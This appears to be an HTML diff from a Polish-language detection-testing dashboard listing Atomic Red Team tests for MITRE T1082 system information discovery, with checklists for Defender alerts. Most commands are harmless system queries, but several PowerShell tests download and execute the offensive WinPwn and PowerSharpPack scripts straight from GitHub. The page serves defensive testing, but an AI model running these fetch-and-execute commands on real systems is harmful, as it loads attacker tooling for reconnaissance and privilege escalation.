+      <button class="art-accordion-btn" onclick="toggleArtAccordion(this)">
+        <span class="badge badge-ps">PowerShell</span>
+        <b>Atomic Test 10: WinPwn - GeneralRecon</b>
+        <span id="tested-badge-T1082-art10" class="badge badge-ok" style="display:none; float:right;">PRZETESTOWANE</span>
+      </button>
+      <div class="art-accordion-content">
+        <div class="test-desc"><b>Opis:</b> </div>
+
+        <div>
+          <b>Polecenia testowe (powershell):</b>
+          <pre>iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
+Generalrecon -consoleoutput -noninteractive</pre>
+          <button class="art-copy-btn" onclick="copyArtCode(this)">Kopiuj</button>
+        </div>
+<a href="..\..\scenarios\atomic_tests\T1082\WinPwn_-_GeneralRecon\test_1.ps1" download>Pobierz test_1.ps1</a><br>
+        <div class="art-checklist" id="checklist-T1082-art10" data-scenario="scenarioBlock" data-label="Atomic Test 10: WinPwn - GeneralRecon">
+          <label><input type="checkbox"> Uruchomiono test</label><br>
+          <label><input type="checkbox"> Wykonano cleanup</label><br>
+          <label><input type="checkbox"> Zdarzenie widoczne w Defenderze</label><br>
+          <label><input type="checkbox"> Utworzono alert</label><br>
+          <button onclick="resetChecklist('T1082','art10','scenarioBlock','Atomic Test 10: WinPwn - GeneralRecon')">Resetuj</button>
+        </div>
+      </div>
+    </div>
+
+    <div class="art-accordion">
+      <button class="art-accordion-btn" onclick="toggleArtAccordion(this)">
+        <span class="badge badge-ps">PowerShell</span>
+        <b>Atomic Test 11: WinPwn - Morerecon</b>
+        <span id="tested-badge-T1082-art11" class="badge badge-ok" style="display:none; float:right;">PRZETESTOWANE</span>
+      </button>
+      <div class="art-accordion-content">
+        <div class="test-desc"><b>Opis:</b> </div>
+
+        <div>
+          <b>Polecenia testowe (powershell):</b>
+          <pre>iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
+Morerecon -noninteractive -consoleoutput</pre>
+          <button class="art-copy-btn" onclick="copyArtCode(this)">Kopiuj</button>
+        </div>
+<a href="..\..\scenarios\atomic_tests\T1082\WinPwn_-_Morerecon\test_1.ps1" download>Pobierz test_1.ps1</a><br>
+        <div class="art-checklist" id="checklist-T1082-art11" data-scenario="scenarioBlock" data-label="Atomic Test 11: WinPwn - Morerecon">
+          <label><input type="checkbox"> Uruchomiono test</label><br>
+          <label><input type="checkbox"> Wykonano cleanup</label><br>
+          <label><input type="checkbox"> Zdarzenie widoczne w Defenderze</label><br>
+          <label><input type="checkbox"> Utworzono alert</label><br>
+          <button onclick="resetChecklist('T1082','art11','scenarioBlock','Atomic Test 11: WinPwn - Morerecon')">Resetuj</button>
+        </div>
+      </div>
+    </div>
+
+    <div class="art-accordion">
+      <button class="art-accordion-btn" onclick="toggleArtAccordion(this)">
+        <span class="badge badge-ps">PowerShell</span>
+        <b>Atomic Test 12: WinPwn - RBCD-Check</b>
+        <span id="tested-badge-T1082-art12" class="badge badge-ok" style="display:none; float:right;">PRZETESTOWANE</span>
+      </button>
+      <div class="art-accordion-content">
+        <div class="test-desc"><b>Opis:</b> </div>
+
+        <div>
+          <b>Polecenia testowe (powershell):</b>
+          <pre>iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
+RBCD-Check -consoleoutput -noninteractive</pre>
+          <button class="art-copy-btn" onclick="copyArtCode(this)">Kopiuj</button>
+        </div>
+<a href="..\..\scenarios\atomic_tests\T1082\WinPwn_-_RBCD-Check\test_1.ps1" download>Pobierz test_1.ps1</a><br>
+        <div class="art-checklist" id="checklist-T1082-art12" data-scenario="scenarioBlock" data-label="Atomic Test 12: WinPwn - RBCD-Check">
+          <label><input type="checkbox"> Uruchomiono test</label><br>
+          <label><input type="checkbox"> Wykonano cleanup</label><br>
+          <label><input type="checkbox"> Zdarzenie widoczne w Defenderze</label><br>
+          <label><input type="checkbox"> Utworzono alert</label><br>
+          <button onclick="resetChecklist('T1082','art12','scenarioBlock','Atomic Test 12: WinPwn - RBCD-Check')">Resetuj</button>
+        </div>
+      </div>
+    </div>
+
+    <div class="art-accordion">
+      <button class="art-accordion-btn" onclick="toggleArtAccordion(this)">
+        <span class="badge badge-ps">PowerShell</span>
+        <b>Atomic Test 13: WinPwn - PowerSharpPack - Watson searching for missing windows patches</b>
+        <span id="tested-badge-T1082-art13" class="badge badge-ok" style="display:none; float:right;">PRZETESTOWANE</span>
+      </button>
+      <div class="art-accordion-content">
+        <div class="test-desc"><b>Opis:</b> </div>
+
+        <div>
+          <b>Polecenia testowe (powershell):</b>
+          <pre>iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-SharpWatson.ps1')
+Invoke-watson</pre>
+          <button class="art-copy-btn" onclick="copyArtCode(this)">Kopiuj</button>
+        </div>
+<a href="..\..\scenarios\atomic_tests\T1082\WinPwn_-_PowerSharpPack_-_Watson_searchi\test_1.ps1" download>Pobierz test_1.ps1</a><br>
+        <div class="art-checklist" id="checklist-T1082-art13" data-scenario="scenarioBlock" data-label="Atomic Test 13: WinPwn - PowerSharpPack - Watson searching for missing windows patches">
+          <label><input type="checkbox"> Uruchomiono test</label><br>
+          <label><input type="checkbox"> Wykonano cleanup</label><br>
+          <label><input type="checkbox"> Zdarzenie widoczne w Defenderze</label><br>
+          <label><input type="checkbox"> Utworzono alert</label><br>
+          <button onclick="resetChecklist('T1082','art13','scenarioBlock','Atomic Test 13: WinPwn - PowerSharpPack - Watson searching for missing windows patches')">Resetuj</button>
+        </div>
+      </div>
+    </div>
+
+    <div class="art-accordion">
+      <button class="art-accordion-btn" onclick="toggleArtAccordion(this)">
+        <span class="badge badge-ps">PowerShell</span>
+        <b>Atomic Test 14: WinPwn - PowerSharpPack - Sharpup checking common Privesc vectors</b>
+        <span id="tested-badge-T1082-art14" class="badge badge-ok" style="display:none; float:right;">PRZETESTOWANE</span>
+      </button>
+      <div class="art-accordion-content">
+        <div class="test-desc"><b>Opis:</b> </div>
+
+        <div>
+          <b>Polecenia testowe (powershell):</b>
+          <pre>iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-SharpUp.ps1')
+Invoke-SharpUp -command &quot;audit&quot;</pre>
+          <button class="art-copy-btn" onclick="copyArtCode(this)">Kopiuj</button>
+        </div>
+<a href="..\..\scenarios\atomic_tests\T1082\WinPwn_-_PowerSharpPack_-_Sharpup_checki\test_1.ps1" download>Pobierz test_1.ps1</a><br>
+        <div class="art-checklist" id="checklist-T1082-art14" data-scenario="scenarioBlock" data-label="Atomic Test 14: WinPwn - PowerSharpPack - Sharpup checking common Privesc vectors">
+          <label><input type="checkbox"> Uruchomiono test</label><br>
+          <label><input type="checkbox"> Wykonano cleanup</label><br>
+          <label><input type="checkbox"> Zdarzenie widoczne w Defenderze</label><br>
+          <label><input type="checkbox"> Utworzono alert</label><br>
+          <button onclick="resetChecklist('T1082','art14','scenarioBlock','Atomic Test 14: WinPwn - PowerSharpPack - Sharpup checking common Privesc vectors')">Resetuj</button>
+        </div>
+      </div>
+    </div>
+
+    <div class="art-accordion">
+      <button class="art-accordion-btn" onclick="toggleArtAccordion(this)">
+        <span class="badge badge-ps">PowerShell</span>
+        <b>Atomic Test 15: WinPwn - PowerSharpPack - Seatbelt</b>
+        <span id="tested-badge-T1082-art15" class="badge badge-ok" style="display:none; float:right;">PRZETESTOWANE</span>
+      </button>
+      <div class="art-accordion-content">
+        <div class="test-desc"><b>Opis:</b> </div>
+
+        <div>
+          <b>Polecenia testowe (powershell):</b>
+          <pre>iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Seatbelt.ps1')
+Invoke-Seatbelt -Command &quot;-group=all&quot;</pre>
+          <button class="art-copy-btn" onclick="copyArtCode(this)">Kopiuj</button>
+        </div>
+<a href="..\..\scenarios\atomic_tests\T1082\WinPwn_-_PowerSharpPack_-_Seatbelt\test_1.ps1" download>Pobierz test_1.ps1</a><br>
+        <div class="art-checklist" id="checklist-T1082-art15" data-scenario="scenarioBlock" data-label="Atomic Test 15: WinPwn - PowerSharpPack - Seatbelt">
+          <label><input type="checkbox"> Uruchomiono test</label><br>
+          <label><input type="checkbox"> Wykonano cleanup</label><br>
+          <label><input type="checkbox"> Zdarzenie widoczne w Defenderze</label><br>
+          <label><input type="checkbox"> Utworzono alert</label><br>
+          <button onclick="resetChecklist('T1082','art15','scenarioBlock','Atomic Test 15: WinPwn - PowerSharpPack - Seatbelt')">Resetuj</button>
+        </div>
+      </div>
+    </div>
+
+    <div class="art-accordion">
+      <button class="art-accordion-btn" onclick="toggleArtAccordion(this)">
+        <span class="badge badge-cmd">CMD</span>
+        <b>Atomic Test 16: System Information Discovery with WMIC</b>
+        <span id="tested-badge-T1082-art16" class="badge badge-ok" style="display:none; float:right;">PRZETESTOWANE</span>
+      </button>
+      <div class="art-accordion-content">
+        <div class="test-desc"><b>Opis:</b> </div>
+
+        <div>
+          <b>Polecenia testowe (cmd):</b>
+          <pre>wmic cpu get name
 wmic MEMPHYSICAL get MaxCapacity
 wmic baseboard get product
 wmic baseboard get version
@@ -44,13 +596,327 @@ wmic path win32_VideoController get DriverVersion
 wmic path win32_VideoController get VideoModeDescription
 wmic OS get Caption,OSArchitecture,Version
 wmic DISKDRIVE get Caption
-Get-WmiObject win32_bios</pre><a href='../../scenarios/atomic_tests\T1082\System_Information_Discovery_with_WMIC/test_1.cmd'>Pobierz test_1.cmd</a><br></li><li><b>System Information Discovery</b><br><b>Polecenia testowe (cmd):</b><pre>wscript.exe C:\Windows\System32\gatherNetworkInfo.vbs</pre><a href='../../scenarios/atomic_tests\T1082\System_Information_Discovery/test_1.cmd'>Pobierz test_1.cmd</a><br></li><li><b>Check computer location</b><br><b>Polecenia testowe (cmd):</b><pre>reg query "HKEY_CURRENT_USER\Control Panel\International\Geo"</pre><a href='../../scenarios/atomic_tests\T1082\Check_computer_location/test_1.cmd'>Pobierz test_1.cmd</a><br></li><li><b>BIOS Information Discovery through Registry</b><br><b>Polecenia testowe (cmd):</b><pre>reg query HKEY_LOCAL_MACHINE\HARDWARE\DESCRIPTION\System /v SystemBiosVersion
-reg query HKEY_LOCAL_MACHINE\HARDWARE\DESCRIPTION\System /v VideoBiosVersion</pre><a href='../../scenarios/atomic_tests\T1082\BIOS_Information_Discovery_through_Regis/test_1.cmd'>Pobierz test_1.cmd</a><br></li><li><b>ESXi - VM Discovery using ESXCLI</b><br><b>Polecenia testowe (cmd):</b><pre>echo "" | "#{plink_file}" "#{vm_host}" -ssh  -l "#{vm_user}" -pw "#{vm_pass}" -m "#{cli_script}"</pre><a href='../../scenarios/atomic_tests\T1082\ESXi_-_VM_Discovery_using_ESXCLI/test_1.cmd'>Pobierz test_1.cmd</a><br></li><li><b>ESXi - Darkside system information discovery</b><br><b>Polecenia testowe (cmd):</b><pre>echo "" | "#{plink_file}" "#{vm_host}" -ssh  -l "#{vm_user}" -pw "#{vm_pass}" -m "#{cli_script}"</pre><a href='../../scenarios/atomic_tests\T1082\ESXi_-_Darkside_system_information_disco/test_1.cmd'>Pobierz test_1.cmd</a><br></li><li><b>operating system discovery</b><br><b>Polecenia testowe (powershell):</b><pre>Get-CimInstance Win32_OperatingSystem | Select-Object Caption, Version, ServicePackMajorVersion, OSArchitecture, CSName, WindowsDirectory | Out-null</pre><a href='../../scenarios/atomic_tests\T1082\operating_system_discovery/test_1.ps1'>Pobierz test_1.ps1</a><br></li><li><b>Check OS version via "ver" command</b><br><b>Polecenia testowe (cmd):</b><pre>ver</pre><a href='../../scenarios/atomic_tests\T1082\Check_OS_version_via__ver__command/test_1.cmd'>Pobierz test_1.cmd</a><br></li><li><b>Display volume shadow copies with "vssadmin"</b><br><b>Polecenia testowe (cmd):</b><pre>vssadmin.exe list shadows</pre><a href='../../scenarios/atomic_tests\T1082\Display_volume_shadow_copies_with__vssad/test_1.cmd'>Pobierz test_1.cmd</a><br></li><li><b>Identify System Locale and Regional Settings with PowerShell</b><br><b>Polecenia testowe (cmd):</b><pre>powershell.exe -c "Get-Culture | Format-List | Out-File -FilePath %TMP%\a.txt"</pre><a href='../../scenarios/atomic_tests\T1082\Identify_System_Locale_and_Regional_Sett/test_1.cmd'>Pobierz test_1.cmd</a><br><b>Polecenia cleanup (cmd):</b><pre>cmd.exe /c del "%TMP%\a.txt"</pre><a href='../../scenarios/atomic_tests\T1082\Identify_System_Locale_and_Regional_Sett/cleanup_1.cmd'>Pobierz cleanup_1.cmd</a><br></li><li><b>Enumerate Available Drives via gdr</b><br><b>Polecenia testowe (cmd):</b><pre>powershell.exe -c "gdr -PSProvider 'FileSystem'"</pre><a href='../../scenarios/atomic_tests\T1082\Enumerate_Available_Drives_via_gdr/test_1.cmd'>Pobierz test_1.cmd</a><br></li><li><b>Discover OS Product Name via Registry</b><br><b>Polecenia testowe (cmd):</b><pre>reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion" /v ProductName</pre><a href='../../scenarios/atomic_tests\T1082\Discover_OS_Product_Name_via_Registry/test_1.cmd'>Pobierz test_1.cmd</a><br></li><li><b>Discover OS Build Number via Registry</b><br><b>Polecenia testowe (cmd):</b><pre>reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion" /v CurrentBuildNumber</pre><a href='../../scenarios/atomic_tests\T1082\Discover_OS_Build_Number_via_Registry/test_1.cmd'>Pobierz test_1.cmd</a><br></li></ul><a href='https://github.com/redcanaryco/atomic-red-team/tree/master/atomics/T1082' target='_blank'>Zobacz wszystkie testy na GitHubie</a></div></div>
-  <div class="tactic section"><b>Tactics:</b> <a href="https://attack.mitre.org/tactics/TA0007/" target="_blank">Discovery (TA0007)</a></div>
-  <div class="status section"><b>Status:</b> Pending</div>
-  <div class="scenario-block"><b>Twój opis scenariusza:</b><br>Opis scenariusza, podatności lub techniki.</div>
-  <div class="desc section"><b>MITRE Description:</b><br>An adversary may attempt to get detailed information about the operating system and hardware, including version, patches, hotfixes, service packs, and architecture. Adversaries may use the information from [System Information Discovery](https://attack.mitre.org/techniques/T1082) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.  Tools such as [Systeminfo](https://attack.mitre.org/software/S0096) can be used to gather detailed system information. If running with privileged access, a breakdown of system data can be gathered through the <code>systemsetup</code> configuration tool on macOS. As an example, adversaries with user-level access can execute the <code>df -aH</code> command to obtain currently mounted disks and associated freely available space. Adversaries may also leverage a [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) on network devices to gather detailed system information (e.g. <code>show version</code>).(Citation: US-CERT-TA18-106A) On ESXi servers, threat actors may gather system information from various esxcli utilities, such as `system hostname get`, `system version get`, and `storage filesystem list` (to list storage volumes).(Citation: Crowdstrike Hypervisor Jackpotting Pt 2 2021)(Citation: Varonis)  Infrastructure as a Service (IaaS) cloud providers such as AWS, GCP, and Azure allow access to instance and virtual machine information via APIs. Successful authenticated API calls can return data such as the operating system platform and status of a particular instance or the model view of a virtual machine.(Citation: Amazon Describe Instance)(Citation: Google Instances Resource)(Citation: Microsoft Virutal Machine API)  [System Information Discovery](https://attack.mitre.org/techniques/T1082) combined with information gathered from other forms of discovery and reconnaissance can drive payload development and concealment.(Citation: OSX.FairyTale)(Citation: 20 macOS Common Tools and Techniques)</div>
-  <div class="link section"><b>MITRE Link:</b> <a href="https://attack.mitre.org/techniques/T1082/" target="_blank">https://attack.mitre.org/techniques/T1082/</a></div>
+Get-WmiObject win32_bios</pre>
+          <button class="art-copy-btn" onclick="copyArtCode(this)">Kopiuj</button>
+        </div>
+<a href="..\..\scenarios\atomic_tests\T1082\System_Information_Discovery_with_WMIC\test_1.cmd" download>Pobierz test_1.cmd</a><br>
+        <div class="art-checklist" id="checklist-T1082-art16" data-scenario="scenarioBlock" data-label="Atomic Test 16: System Information Discovery with WMIC">
+          <label><input type="checkbox"> Uruchomiono test</label><br>
+          <label><input type="checkbox"> Wykonano cleanup</label><br>
+          <label><input type="checkbox"> Zdarzenie widoczne w Defenderze</label><br>
+          <label><input type="checkbox"> Utworzono alert</label><br>
+          <button onclick="resetChecklist('T1082','art16','scenarioBlock','Atomic Test 16: System Information Discovery with WMIC')">Resetuj</button>
+        </div>
+      </div>
+    </div>
+
+    <div class="art-accordion">
+      <button class="art-accordion-btn" onclick="toggleArtAccordion(this)">
+        <span class="badge badge-cmd">CMD</span>
+        <b>Atomic Test 17: System Information Discovery</b>
+        <span id="tested-badge-T1082-art17" class="badge badge-ok" style="display:none; float:right;">PRZETESTOWANE</span>
+      </button>
+      <div class="art-accordion-content">
+        <div class="test-desc"><b>Opis:</b> </div>
+
+        <div>
+          <b>Polecenia testowe (cmd):</b>
+          <pre>wscript.exe C:\Windows\System32\gatherNetworkInfo.vbs</pre>
+          <button class="art-copy-btn" onclick="copyArtCode(this)">Kopiuj</button>
+        </div>
+<a href="..\..\scenarios\atomic_tests\T1082\System_Information_Discovery\test_1.cmd" download>Pobierz test_1.cmd</a><br>
+        <div class="art-checklist" id="checklist-T1082-art17" data-scenario="scenarioBlock" data-label="Atomic Test 17: System Information Discovery">
+          <label><input type="checkbox"> Uruchomiono test</label><br>
+          <label><input type="checkbox"> Wykonano cleanup</label><br>
+          <label><input type="checkbox"> Zdarzenie widoczne w Defenderze</label><br>
+          <label><input type="checkbox"> Utworzono alert</label><br>
+          <button onclick="resetChecklist('T1082','art17','scenarioBlock','Atomic Test 17: System Information Discovery')">Resetuj</button>
+        </div>
+      </div>
+    </div>
+
+    <div class="art-accordion">
+      <button class="art-accordion-btn" onclick="toggleArtAccordion(this)">
+        <span class="badge badge-cmd">CMD</span>
+        <b>Atomic Test 18: Check computer location</b>
+        <span id="tested-badge-T1082-art18" class="badge badge-ok" style="display:none; float:right;">PRZETESTOWANE</span>
+      </button>
+      <div class="art-accordion-content">
+        <div class="test-desc"><b>Opis:</b> </div>
+
+        <div>
+          <b>Polecenia testowe (cmd):</b>
+          <pre>reg query &quot;HKEY_CURRENT_USER\Control Panel\International\Geo&quot;</pre>
+          <button class="art-copy-btn" onclick="copyArtCode(this)">Kopiuj</button>
+        </div>
+<a href="..\..\scenarios\atomic_tests\T1082\Check_computer_location\test_1.cmd" download>Pobierz test_1.cmd</a><br>
+        <div class="art-checklist" id="checklist-T1082-art18" data-scenario="scenarioBlock" data-label="Atomic Test 18: Check computer location">
+          <label><input type="checkbox"> Uruchomiono test</label><br>
+          <label><input type="checkbox"> Wykonano cleanup</label><br>
+          <label><input type="checkbox"> Zdarzenie widoczne w Defenderze</label><br>
+          <label><input type="checkbox"> Utworzono alert</label><br>
+          <button onclick="resetChecklist('T1082','art18','scenarioBlock','Atomic Test 18: Check computer location')">Resetuj</button>
+        </div>
+      </div>
+    </div>
+
+    <div class="art-accordion">
+      <button class="art-accordion-btn" onclick="toggleArtAccordion(this)">
+        <span class="badge badge-cmd">CMD</span>
+        <b>Atomic Test 19: BIOS Information Discovery through Registry</b>
+        <span id="tested-badge-T1082-art19" class="badge badge-ok" style="display:none; float:right;">PRZETESTOWANE</span>
+      </button>
+      <div class="art-accordion-content">
+        <div class="test-desc"><b>Opis:</b> </div>
+
+        <div>
+          <b>Polecenia testowe (cmd):</b>
+          <pre>reg query HKEY_LOCAL_MACHINE\HARDWARE\DESCRIPTION\System /v SystemBiosVersion
+reg query HKEY_LOCAL_MACHINE\HARDWARE\DESCRIPTION\System /v VideoBiosVersion</pre>
+          <button class="art-copy-btn" onclick="copyArtCode(this)">Kopiuj</button>
+        </div>
+<a href="..\..\scenarios\atomic_tests\T1082\BIOS_Information_Discovery_through_Regis\test_1.cmd" download>Pobierz test_1.cmd</a><br>
+        <div class="art-checklist" id="checklist-T1082-art19" data-scenario="scenarioBlock" data-label="Atomic Test 19: BIOS Information Discovery through Registry">
+          <label><input type="checkbox"> Uruchomiono test</label><br>
+          <label><input type="checkbox"> Wykonano cleanup</label><br>
+          <label><input type="checkbox"> Zdarzenie widoczne w Defenderze</label><br>
+          <label><input type="checkbox"> Utworzono alert</label><br>
+          <button onclick="resetChecklist('T1082','art19','scenarioBlock','Atomic Test 19: BIOS Information Discovery through Registry')">Resetuj</button>
+        </div>
+      </div>
+    </div>
+
+    <div class="art-accordion">
+      <button class="art-accordion-btn" onclick="toggleArtAccordion(this)">
+        <span class="badge badge-cmd">CMD</span>
+        <b>Atomic Test 20: ESXi - VM Discovery using ESXCLI</b>
+        <span id="tested-badge-T1082-art20" class="badge badge-ok" style="display:none; float:right;">PRZETESTOWANE</span>
+      </button>
+      <div class="art-accordion-content">
+        <div class="test-desc"><b>Opis:</b> </div>
+
+        <div>
+          <b>Polecenia testowe (cmd):</b>
+          <pre>echo &quot;&quot; | &quot;#{plink_file}&quot; &quot;#{vm_host}&quot; -ssh  -l &quot;#{vm_user}&quot; -pw &quot;#{vm_pass}&quot; -m &quot;#{cli_script}&quot;</pre>
+          <button class="art-copy-btn" onclick="copyArtCode(this)">Kopiuj</button>
+        </div>
+<a href="..\..\scenarios\atomic_tests\T1082\ESXi_-_VM_Discovery_using_ESXCLI\test_1.cmd" download>Pobierz test_1.cmd</a><br>
+        <div class="art-checklist" id="checklist-T1082-art20" data-scenario="scenarioBlock" data-label="Atomic Test 20: ESXi - VM Discovery using ESXCLI">
+          <label><input type="checkbox"> Uruchomiono test</label><br>
+          <label><input type="checkbox"> Wykonano cleanup</label><br>
+          <label><input type="checkbox"> Zdarzenie widoczne w Defenderze</label><br>
+          <label><input type="checkbox"> Utworzono alert</label><br>
+          <button onclick="resetChecklist('T1082','art20','scenarioBlock','Atomic Test 20: ESXi - VM Discovery using ESXCLI')">Resetuj</button>
+        </div>
+      </div>
+    </div>
+
+    <div class="art-accordion">
+      <button class="art-accordion-btn" onclick="toggleArtAccordion(this)">
+        <span class="badge badge-cmd">CMD</span>
+        <b>Atomic Test 21: ESXi - Darkside system information discovery</b>
+        <span id="tested-badge-T1082-art21" class="badge badge-ok" style="display:none; float:right;">PRZETESTOWANE</span>
+      </button>
+      <div class="art-accordion-content">
+        <div class="test-desc"><b>Opis:</b> </div>
+
+        <div>
+          <b>Polecenia testowe (cmd):</b>
+          <pre>echo &quot;&quot; | &quot;#{plink_file}&quot; &quot;#{vm_host}&quot; -ssh  -l &quot;#{vm_user}&quot; -pw &quot;#{vm_pass}&quot; -m &quot;#{cli_script}&quot;</pre>
+          <button class="art-copy-btn" onclick="copyArtCode(this)">Kopiuj</button>
+        </div>
+<a href="..\..\scenarios\atomic_tests\T1082\ESXi_-_Darkside_system_information_disco\test_1.cmd" download>Pobierz test_1.cmd</a><br>
+        <div class="art-checklist" id="checklist-T1082-art21" data-scenario="scenarioBlock" data-label="Atomic Test 21: ESXi - Darkside system information discovery">
+          <label><input type="checkbox"> Uruchomiono test</label><br>
+          <label><input type="checkbox"> Wykonano cleanup</label><br>
+          <label><input type="checkbox"> Zdarzenie widoczne w Defenderze</label><br>
+          <label><input type="checkbox"> Utworzono alert</label><br>
+          <button onclick="resetChecklist('T1082','art21','scenarioBlock','Atomic Test 21: ESXi - Darkside system information discovery')">Resetuj</button>
+        </div>
+      </div>
+    </div>
+
+    <div class="art-accordion">
+      <button class="art-accordion-btn" onclick="toggleArtAccordion(this)">
+        <span class="badge badge-ps">PowerShell</span>
+        <b>Atomic Test 22: operating system discovery</b>
+        <span id="tested-badge-T1082-art22" class="badge badge-ok" style="display:none; float:right;">PRZETESTOWANE</span>
+      </button>
+      <div class="art-accordion-content">
+        <div class="test-desc"><b>Opis:</b> </div>
+
+        <div>
+          <b>Polecenia testowe (powershell):</b>
+          <pre>Get-CimInstance Win32_OperatingSystem | Select-Object Caption, Version, ServicePackMajorVersion, OSArchitecture, CSName, WindowsDirectory | Out-null</pre>
+          <button class="art-copy-btn" onclick="copyArtCode(this)">Kopiuj</button>
+        </div>
+<a href="..\..\scenarios\atomic_tests\T1082\operating_system_discovery\test_1.ps1" download>Pobierz test_1.ps1</a><br>
+        <div class="art-checklist" id="checklist-T1082-art22" data-scenario="scenarioBlock" data-label="Atomic Test 22: operating system discovery">
+          <label><input type="checkbox"> Uruchomiono test</label><br>
+          <label><input type="checkbox"> Wykonano cleanup</label><br>
+          <label><input type="checkbox"> Zdarzenie widoczne w Defenderze</label><br>
+          <label><input type="checkbox"> Utworzono alert</label><br>
+          <button onclick="resetChecklist('T1082','art22','scenarioBlock','Atomic Test 22: operating system discovery')">Resetuj</button>
+        </div>
+      </div>
+    </div>
+
+    <div class="art-accordion">
+      <button class="art-accordion-btn" onclick="toggleArtAccordion(this)">
+        <span class="badge badge-cmd">CMD</span>
+        <b>Atomic Test 23: Check OS version via &quot;ver&quot; command</b>
+        <span id="tested-badge-T1082-art23" class="badge badge-ok" style="display:none; float:right;">PRZETESTOWANE</span>
+      </button>
+      <div class="art-accordion-content">
+        <div class="test-desc"><b>Opis:</b> </div>
+
+        <div>
+          <b>Polecenia testowe (cmd):</b>
+          <pre>ver</pre>
+          <button class="art-copy-btn" onclick="copyArtCode(this)">Kopiuj</button>
+        </div>
+<a href="..\..\scenarios\atomic_tests\T1082\Check_OS_version_via__ver__command\test_1.cmd" download>Pobierz test_1.cmd</a><br>
+        <div class="art-checklist" id="checklist-T1082-art23" data-scenario="scenarioBlock" data-label="Atomic Test 23: Check OS version via &quot;ver&quot; command">
+          <label><input type="checkbox"> Uruchomiono test</label><br>
+          <label><input type="checkbox"> Wykonano cleanup</label><br>
+          <label><input type="checkbox"> Zdarzenie widoczne w Defenderze</label><br>
+          <label><input type="checkbox"> Utworzono alert</label><br>
+          <button onclick="resetChecklist('T1082','art23','scenarioBlock','Atomic Test 23: Check OS version via &quot;ver&quot; command')">Resetuj</button>
+        </div>
+      </div>
+    </div>
+
+    <div class="art-accordion">
+      <button class="art-accordion-btn" onclick="toggleArtAccordion(this)">
+        <span class="badge badge-cmd">CMD</span>
+        <b>Atomic Test 24: Display volume shadow copies with &quot;vssadmin&quot;</b>
+        <span id="tested-badge-T1082-art24" class="badge badge-ok" style="display:none; float:right;">PRZETESTOWANE</span>
+      </button>
+      <div class="art-accordion-content">
+        <div class="test-desc"><b>Opis:</b> </div>
+
+        <div>
+          <b>Polecenia testowe (cmd):</b>
+          <pre>vssadmin.exe list shadows</pre>
+          <button class="art-copy-btn" onclick="copyArtCode(this)">Kopiuj</button>
+        </div>
+<a href="..\..\scenarios\atomic_tests\T1082\Display_volume_shadow_copies_with__vssad\test_1.cmd" download>Pobierz test_1.cmd</a><br>
+        <div class="art-checklist" id="checklist-T1082-art24" data-scenario="scenarioBlock" data-label="Atomic Test 24: Display volume shadow copies with &quot;vssadmin&quot;">
+          <label><input type="checkbox"> Uruchomiono test</label><br>
+          <label><input type="checkbox"> Wykonano cleanup</label><br>
+          <label><input type="checkbox"> Zdarzenie widoczne w Defenderze</label><br>
+          <label><input type="checkbox"> Utworzono alert</label><br>
+          <button onclick="resetChecklist('T1082','art24','scenarioBlock','Atomic Test 24: Display volume shadow copies with &quot;vssadmin&quot;')">Resetuj</button>
+        </div>
+      </div>
+    </div>
+
+    <div class="art-accordion">
+      <button class="art-accordion-btn" onclick="toggleArtAccordion(this)">
+        <span class="badge badge-cmd">CMD</span>
+        <b>Atomic Test 25: Identify System Locale and Regional Settings with PowerShell</b>
+        <span id="tested-badge-T1082-art25" class="badge badge-ok" style="display:none; float:right;">PRZETESTOWANE</span>
+      </button>
+      <div class="art-accordion-content">
+        <div class="test-desc"><b>Opis:</b> </div>
+
+        <div>
+          <b>Polecenia testowe (cmd):</b>
+          <pre>powershell.exe -c &quot;Get-Culture | Format-List | Out-File -FilePath %TMP%\a.txt&quot;</pre>
+          <button class="art-copy-btn" onclick="copyArtCode(this)">Kopiuj</button>
+        </div>
+<a href="..\..\scenarios\atomic_tests\T1082\Identify_System_Locale_and_Regional_Sett\test_1.cmd" download>Pobierz test_1.cmd</a><br>
+        <div class="test-cleanup">
+          <b>Cleanup (cmd):</b>
+          <pre>cmd.exe /c del &quot;%TMP%\a.txt&quot;</pre>
+        </div>
+<a href="..\..\scenarios\atomic_tests\T1082\Identify_System_Locale_and_Regional_Sett\cleanup_1.cmd" download>Pobierz cleanup_1.cmd</a><br>
+        <div class="art-checklist" id="checklist-T1082-art25" data-scenario="scenarioBlock" data-label="Atomic Test 25: Identify System Locale and Regional Settings with PowerShell">
+          <label><input type="checkbox"> Uruchomiono test</label><br>
+          <label><input type="checkbox"> Wykonano cleanup</label><br>
+          <label><input type="checkbox"> Zdarzenie widoczne w Defenderze</label><br>
+          <label><input type="checkbox"> Utworzono alert</label><br>
+          <button onclick="resetChecklist('T1082','art25','scenarioBlock','Atomic Test 25: Identify System Locale and Regional Settings with PowerShell')">Resetuj</button>
+        </div>
+      </div>
+    </div>
+
+    <div class="art-accordion">
+      <button class="art-accordion-btn" onclick="toggleArtAccordion(this)">
+        <span class="badge badge-cmd">CMD</span>
+        <b>Atomic Test 26: Enumerate Available Drives via gdr</b>
+        <span id="tested-badge-T1082-art26" class="badge badge-ok" style="display:none; float:right;">PRZETESTOWANE</span>
+      </button>
+      <div class="art-accordion-content">
+        <div class="test-desc"><b>Opis:</b> </div>
+
+        <div>
+          <b>Polecenia testowe (cmd):</b>
+          <pre>powershell.exe -c &quot;gdr -PSProvider 'FileSystem'&quot;</pre>
+          <button class="art-copy-btn" onclick="copyArtCode(this)">Kopiuj</button>
